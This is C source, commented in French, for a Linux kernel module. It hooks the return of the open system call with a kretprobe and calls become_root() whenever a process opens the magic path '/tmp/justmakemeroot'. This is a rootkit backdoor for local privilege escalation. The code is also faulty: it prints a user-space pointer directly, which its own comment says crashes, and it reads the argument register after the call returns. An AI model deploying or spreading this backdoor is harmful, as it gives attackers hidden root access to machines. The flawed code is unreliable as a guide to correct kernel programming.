/*
* Les KRETPROBES interceptent le retour de l'appel système
* (à la différence des kprobes simples, qui interceptent l'appel lui-même)
*
*/

#include "rootest.h"

int ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs) 
{

    printk(KERN_INFO "ret_handler called !\n");
  // __user indique que la mémoire pointée se trouve en userland (c'est juste indicatif)
  // regs->di récupère le premier argument de l'appel système intercepté en x86
  // Le typecast s'assure que la valeur retournée est un pointeur char dans le userland
    const char __user *filename = (const char __user *)regs->di;

    char fname[256] = {0};
    // On vérifie que l'adresse est bien accessible
    if (!access_ok(filename, sizeof(fname))) {
      printk(KERN_INFO "Adresse de filename non accessible ou invalide\n");
      return 0;
    }


    printk(KERN_INFO "Nom de fichier copié : %s\n", filename); // Plantage dès qu'on essaie d'afficher la valeur de filename

    // Utilisation de copy_from_user pour vérifier si des octets n'ont pas été copiés
    if (copy_from_user(fname, filename, sizeof(fname) - 1)) {
        printk(KERN_INFO "Erreur lors de la copie du nom de fichier depuis l'espace utilisateur\n");
        return 0;  
    }

    fname[sizeof(fname) - 1] = '\0';  // On check que fname termine bien par zéro


    if (strcmp(fname, "/tmp/justmakemeroot") == 0) {

      printk(KERN_INFO "Condition de nom de fichier remplie\n");
      become_root();
    }

  return 0;
}

struct kretprobe rootkit_kretprobe = {
    .handler = ret_handler,
    .kp.symbol_name = "__x64_sys_open",
};
